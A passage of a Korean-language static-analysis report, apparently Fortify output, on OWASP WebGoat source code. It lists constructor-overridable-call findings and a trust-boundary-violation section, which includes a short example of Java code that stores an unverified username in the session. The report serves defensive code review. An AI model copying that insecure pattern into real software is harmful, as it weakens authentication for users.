                            <Abstract>RoleBasedAccessControl.java의 165 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>165</LineStart>
<Snippet>	registerAction(new UpdateProfile(this, myClassName,
		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));
	registerAction(new DeleteProfile(this, myClassName,
		DELETEPROFILE_ACTION, getAction(LISTSTAFF_ACTION)));
    }</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="82621CFD29147E47E261EC7B13859323" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 151 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>151</LineStart>
<Snippet>	String myClassName = parseClassName(this.getClass().getName());
	registerAction(new ListStaff(this, myClassName, LISTSTAFF_ACTION));
	registerAction(new SearchStaff(this, myClassName, SEARCHSTAFF_ACTION));
	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, EDITPROFILE_ACTION));</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D01E8C3B3A9A446059B04DB981440B24" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 159 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>159</LineStart>
<Snippet>	registerAction(new ListStaff(this, myClassName, LISTSTAFF_ACTION));
	registerAction(new SearchStaff(this, myClassName, SEARCHSTAFF_ACTION));
	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, EDITPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, CREATEPROFILE_ACTION));</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A138B7F310FDE910A3D1F1B11151FDAF" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 170 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>170</LineStart>
<Snippet>		getAction(LISTSTAFF_ACTION)));
	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,
		getAction(LOGIN_ACTION)));
	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,
		getAction(VIEWPROFILE_ACTION)));</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1FDE9E3D6EDDBB6E6F626A695AFDE1A2" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 173 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>173</LineStart>
<Snippet>		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));
	registerAction(new DeleteProfile(this, myClassName,
		DELETEPROFILE_ACTION, getAction(LISTSTAFF_ACTION)));
    }
</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="82621CFD29147E47E261EC7B13859326" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 154 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>154</LineStart>
<Snippet>	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, EDITPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, CREATEPROFILE_ACTION));

	// These actions are special in that they chain to other actions.</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D0C33A4795D7223ED6321112B01A9031" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 158 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>158</LineStart>
<Snippet>	// These actions are special in that they chain to other actions.
	registerAction(new Login(this, myClassName, LOGIN_ACTION,
		getAction(LISTSTAFF_ACTION)));
	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,
		getAction(LOGIN_ACTION)));</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D0C33A4795D7223ED6321112B01A9032" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 166 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>166</LineStart>
<Snippet>		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));
	registerAction(new DeleteProfile(this, myClassName,
		DELETEPROFILE_ACTION, getAction(LISTSTAFF_ACTION)));
    }
</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5F64A45B48464CBE4AE7D4572D0A3E68" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 171 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>171</LineStart>
<Snippet>		getAction(VIEWPROFILE_ACTION)));
	registerAction(new UpdateProfile(this, myClassName,
		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));
	registerAction(new DeleteProfile(this, myClassName,
		DELETEPROFILE_ACTION, getAction(LISTSTAFF_ACTION)));</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="94BAB3D8E34131F20FBF0CD9E44EE1E5" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 167 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>167</LineStart>
<Snippet>		getAction(LISTSTAFF_ACTION)));
	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,
		getAction(LOGIN_ACTION)));
	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,
		getAction(VIEWPROFILE_ACTION)));</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="82621CFD29147E47E261EC7B13859322" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 150 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>150</LineStart>
<Snippet>    {
	String myClassName = parseClassName(this.getClass().getName());
	registerAction(new ListStaff(this, myClassName, LISTSTAFF_ACTION));
	registerAction(new SearchStaff(this, myClassName, SEARCHSTAFF_ACTION));
	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C99BF6F7C13B6FEC09F7DFC731777E39" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 163 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>163</LineStart>
<Snippet>	registerAction(new SearchStaff(this, myClassName, SEARCHSTAFF_ACTION));
	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, EDITPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, CREATEPROFILE_ACTION));
</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D74D17E5EB5B12FC0EA3717D996A25F8" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 160 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>160</LineStart>
<Snippet>		getAction(LISTSTAFF_ACTION)));
	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,
		getAction(LOGIN_ACTION)));
	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,
		getAction(VIEWPROFILE_ACTION)));</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8725A59F95BE9B010DF3FD808D928D83" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 168 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>168</LineStart>
<Snippet>	// These actions are special in that they chain to other actions.
	registerAction(new Login(this, myClassName, LOGIN_ACTION,
		getAction(LISTSTAFF_ACTION)));
	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,
		getAction(LOGIN_ACTION)));</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="82621CFD29147E47E261EC7B13859324" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 152 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>152</LineStart>
<Snippet>	registerAction(new ListStaff(this, myClassName, LISTSTAFF_ACTION));
	registerAction(new SearchStaff(this, myClassName, SEARCHSTAFF_ACTION));
	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, EDITPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, CREATEPROFILE_ACTION));</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D01E8C3B3A9A446059B04DB981440B28" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 166 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>166</LineStart>
<Snippet>	registerAction(new Login(this, myClassName, LOGIN_ACTION,
		getAction(LISTSTAFF_ACTION)));
	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,
		getAction(LOGIN_ACTION)));
	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D01E8C3B3A9A446059B04DB981440B29" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 168 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>168</LineStart>
<Snippet>	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,
		getAction(LOGIN_ACTION)));
	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,
		getAction(VIEWPROFILE_ACTION)));
	registerAction(new UpdateProfile(this, myClassName,</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="82621CFD29147E47E261EC7B13859329" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 161 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>161</LineStart>
<Snippet>	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,
		getAction(LOGIN_ACTION)));
	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,
		getAction(VIEWPROFILE_ACTION)));
	registerAction(new UpdateProfile(this, myClassName,</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9EB26A211AFC63CE112B5498BE88E7B6" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>WelcomeScreen.java의 56 줄에서 WelcomeScreen의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WelcomeScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WelcomeScreen.java</FilePath>
<LineStart>56</LineStart>
<Snippet>    public WelcomeScreen(WebSession s)
    {
	setup(s);
    }
</Snippet>
<TargetFunction>FunctionCall: setup()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5F64A45B48464CBE4AE7D4572D0A3E67" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 169 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>169</LineStart>
<Snippet>		getAction(LOGIN_ACTION)));
	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,
		getAction(VIEWPROFILE_ACTION)));
	registerAction(new UpdateProfile(this, myClassName,
		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D01E8C3B3A9A446059B04DB981440B22" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 157 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>157</LineStart>
<Snippet>    {
	String myClassName = parseClassName(this.getClass().getName());
	registerAction(new ListStaff(this, myClassName, LISTSTAFF_ACTION));
	registerAction(new SearchStaff(this, myClassName, SEARCHSTAFF_ACTION));
	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D01E8C3B3A9A446059B04DB981440B2A" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 170 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>170</LineStart>
<Snippet>	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,
		getAction(VIEWPROFILE_ACTION)));
	registerAction(new UpdateProfile(this, myClassName,
		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));
	registerAction(new DeleteProfile(this, myClassName,</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C99BF6F7C13B6FEC09F7DFC731777E3A" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 164 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>164</LineStart>
<Snippet>	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, EDITPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, CREATEPROFILE_ACTION));

	// These actions are special in that they chain to other actions.</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="42">
                        <groupTitle>Trust Boundary Violation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>신뢰의 경계는 프로그램으로 그어 놓은 선으로 생각할 수 있습니다. 선의 이쪽에서는 데이터를 신뢰하지 않습니다. 선의 반대편에서는 데이터를 신뢰할 수 있다고 간주합니다. 검증 로직을 사용하는 목적은 데이터가 신뢰의 경계를 안전하게 건너는 것 즉, 신뢰할 수 없는 데이터에서 신뢰할 수 있는 데이터로 이동하는 것을 허용하기 위해서입니다.

Trust boundary violation은 신뢰할 수 있는 것과 신뢰할 수 없는 것 사이의 경계를 프로그램이 흐릴 때 발생합니다. 이런 실수를 범하는 가장 흔한 방식은 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 같은 데이터 구조체에 혼합하는 것입니다. 



예제: 다음 Java 코드는 HTTP 요청을 받아 사용자가 인증되었는지 확인하기 전에 usrname 매개 변수를 HTTP 세션 개체에 저장합니다.


usrname = request.getParameter("usrname");
if (session.getAttribute(ATTR_USR) != null) {
    session.setAttribute(ATTR_USR, usrname);
}


잘 설계되고 유지 관리되는 신뢰 경계가 없으면 프로그래머는 어떤 데이터가 확인 작업을 거치고 거치지 않았는지에 대한 추적을 놓칠 수밖에 없습니다. 이런 혼란은 결국 일부 데이터를 확인하지 않고 사용하는 실수로 이어집니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>응용 프로그램에 분명한 신뢰 경계를 정의하십시오. 같은 데이터 구조체를 사용하여 신뢰할 수 있는 데이터를 한 컨텍스트에, 신뢰할 수 없는 데이터를 다른 컨텍스트에 보관해서는 안 됩니다. 데이터가 신뢰의 경계를 이동할 수 있는 방법의 수를 최소화합니다.

Trust boundary violation은 처리하기 전에 일련의 사용자 상호 작용을 거쳐 입력을 생성해야 하는 경우에 발생합니다. 모든 데이터가 도착할 때까지는 입력값 검증을 완료할 수 없습니다. 이런 경우, 신뢰 경계를 유지하는 것이 중요합니다. 신뢰할 수 없는 단일 데이터 구조체에 신뢰할 수 없는 데이터를 보관하여 확인한 다음 신뢰할 수 있는 위치로 이동해야 합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 확인되지 않은 데이터를 신뢰할 수 있는 것으로 가정하는 "증거가 명백한" 상황을 찾을 필요가 없습니다. 신뢰 경계를 분명하게 긋고 지키지 않으면 검증 오류를 피할 수 없습니다. 익스플로이트 시나리오를 검색하는 데 시간을 허비하기보다 프로그래머에게 명확한 신뢰 경계를 작성하도록 가르치는 데 집중해야 합니다.

2. 대부분의 프로그램에는 응용 프로그램의 의미로 정의되는 신뢰 경계가 있습니다. 사용자 입력이 신뢰 경계를 넘는 다른 경우를 검사하기 위해 사용자 지정 규칙을 작성하는 것도 고려해야 합니다.

3. 많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>42</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="22F4AF14237FE1EEB67ECEBAF0488889" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 같은 데이터 구조체에 신뢰할 수 있는 데이터와 신뢰할 수 없는 데이터를 혼합합니다. 프로그래머가 실수로 확인되지 않은 데이터를 신뢰하는 일이 발생합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>javax.servlet.http.HttpSession.setAttribute()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DE4758DCB9A25AA7FE20122224906639" ruleID="6BD6C596-62D2-4ACE-B61F-9F8733AC2185">
                            <Category>Trust Boundary Violation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
